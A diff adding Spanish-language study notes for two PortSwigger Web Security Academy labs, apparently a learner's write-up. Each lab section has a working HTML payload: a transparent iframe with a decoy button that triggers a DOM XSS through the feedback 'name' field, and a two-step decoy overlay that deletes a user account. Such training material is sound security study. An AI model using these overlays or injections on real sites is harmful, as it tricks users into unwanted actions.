@@ -89,4 +89,74 @@ La pagina victima tenia que estar arriba para bypassear el frame buster
 </body>
 ```
 
-#
+## Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS
+
+La página tenia un archivo `submitFeedback.js` que provocaba una vulnerabilidad XSS DOM ya que incrustaba el valor del campo `name` que se enviaba a la hora de hacer un feedback: 
+```html
+<style>
+	iframe {
+		position:relative;
+		width: 1000px;
+		height: 1000px;
+		opacity: 0.00001;
+		z-index: 2;
+	}
+  #test {
+		position:absolute;
+        width: 200px;
+        height: 40px;
+		top: 819;
+		left: 0;
+		z-index: 0;
+	}
+</style>
+<button id="test">Click me</button>
+<iframe
+src="https://0aed007504bb17cd831be7ba0061003b.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
+```
+
+## Lab: Multistep clickjacking
+
+Debido a que la página solicitaba confirmación para eliminar el usuario se aplicaron dos señuelos clickeables para seleccionar eliminar y para confirmar la eliminación: 
+```html
+<html> 
+<head> 
+<style>
+  #ventana1 {
+		position:relative;
+		width: 1000px;
+		height: 1000px;
+		opacity: 0.0000001;
+		z-index:3;
+	}
+  #uno {
+    position: absolute; 
+    background-color: red;
+    width: 150px;
+    height: 40px;
+    top: 500px; 
+    left: 20px;
+    z-index: 2; 
+  }
+  #dos{
+    position: absolute; 
+    background-color: blue;
+    width: 150px;
+    height: 40px;
+    top: 300px; 
+    left: 170px;
+    z-index: 1; 
+  }
+</style>
+</head>
+<body> 
+
+<div id="uno">Click me first</div>
+<div id="dos">Click me next</div>
+
+<iframe id="ventana1" src="https://0ac1003804c9eabd80d01c5400ca0079.web-security-academy.net/my-account"></iframe>
+
+</body>
+</html>
+```
+
